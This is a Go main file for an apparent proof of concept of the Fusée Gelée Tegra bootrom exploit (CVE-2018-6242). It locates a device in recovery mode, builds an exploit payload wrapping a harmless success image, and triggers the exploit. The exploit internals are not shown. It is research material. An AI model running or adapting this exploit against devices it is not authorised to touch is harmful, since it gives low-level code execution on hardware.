package main

import (
	"fmt"
	"log"
	"os"

	"github.com/SaadSaid158/fusee-gelee-poc/internal/display"
	"github.com/SaadSaid158/fusee-gelee-poc/internal/exploit"
	"github.com/SaadSaid158/fusee-gelee-poc/internal/usb"
)

func main() {
	fmt.Println("Fusée Gelée PoC (CVE-2018-6242)")
	fmt.Println("================================")
	fmt.Println("⚠️  For educational and research purposes only!")
	fmt.Println()

	// Initialize USB context
	ctx, err := usb.NewContext()
	if err != nil {
		log.Fatalf("Failed to initialize USB context: %v", err)
	}
	defer ctx.Close()

	// Find Tegra device in RCM mode
	fmt.Println("🔍 Searching for Tegra device in RCM mode...")
	device, err := ctx.FindRCMDevice()
	if err != nil {
		log.Fatalf("Failed to find RCM device: %v", err)
	}
	defer device.Close()

	fmt.Println("✓ Found Tegra device in RCM mode!")
	fmt.Printf("  Device: %s\n", device.String())
	fmt.Println()

	// Read device ID
	fmt.Println("📋 Reading device ID...")
	deviceID, err := device.ReadDeviceID()
	if err != nil {
		log.Fatalf("Failed to read device ID: %v", err)
	}
	fmt.Printf("  Device ID: %X\n", deviceID)
	fmt.Println()

	// Load success image payload
	fmt.Println("📦 Loading payload...")
	payload, err := display.LoadSuccessImage()
	if err != nil {
		log.Fatalf("Failed to load payload: %v", err)
	}
	fmt.Printf("  Payload size: %d bytes\n", len(payload))
	fmt.Println()

	// Build exploit payload
	fmt.Println("🔧 Building exploit...")
	exploitPayload := exploit.BuildPayload(payload)
	fmt.Printf("  Exploit payload size: %d bytes\n", len(exploitPayload))
	fmt.Println()

	// Trigger the exploit
	fmt.Println("🚀 Triggering Fusée Gelée exploit...")
	err = device.TriggerExploit(exploitPayload)
	if err != nil {
		log.Fatalf("Failed to trigger exploit: %v", err)
	}

	fmt.Println("✓ Exploit triggered successfully!")
	fmt.Println()
	fmt.Println("🎉 If successful, you should see a success image on the device screen!")
	fmt.Println()
	fmt.Println("Stay curious, stay ethical! 🔐")

	os.Exit(0)
}
